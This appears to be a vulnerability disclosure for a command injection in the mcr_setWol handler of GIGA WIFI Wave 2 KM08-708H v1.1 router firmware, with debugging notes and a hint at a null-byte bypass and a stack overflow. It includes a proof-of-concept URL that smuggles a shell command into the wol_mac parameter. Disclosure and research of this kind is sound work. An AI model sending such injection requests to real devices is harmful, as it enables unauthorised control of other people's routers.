Affected Versions:

GIGA WIFI Wave 2 - KM08-708H - v1.1
![](image/508244ea57bb91b1498a8d1558e9ca9c.png)

Command injection:

There is a command injection vulnerability in the function mcr_setWol. In line 9, the value of the Var variable is the wol_mac parameter, and in line 10, only length filtering is performed on Var before it is concatenated with v5 and executed directly as system, resulting in a command injection.

![](image/12efce9c519498d624e7b7aa4c8acd1e.png)

Firmware Emulation Vulnerability Testing:

![](image/3d1f21e5296e30b209e9e1112562ba64.png)
![](image/77e81d1c479ba0a2694e195d0fb2ebd5.png)

poc：
```
http://172.30.1.254:8899/goform/mcr_setWol?wol_mac=ls>/tmp/bbaa1.txt&redirect_url=/new/UserFolder/3_6_2_wakeonlan.asp
```




gdb动调：
jalr $t9 为call system() 参数A0：“/bin/wol -b -i br0 ls>/tmp/bbaaa.txt” 
![](image/72aaf2a5c9b25f4101b88c41fa76cff3.png)

IDA逆向发现对以下字符过滤：
![](image/1f6841e6ef2c202e007a593d5f6c826e.png)
![](image/d5df280c8ea682e00df99ac1fa20bd9b.png)
![](image/602c5f6c9a1b516339e6ad5ba658cd8e.png)strlen可以\x00绕过 应该还有个栈溢出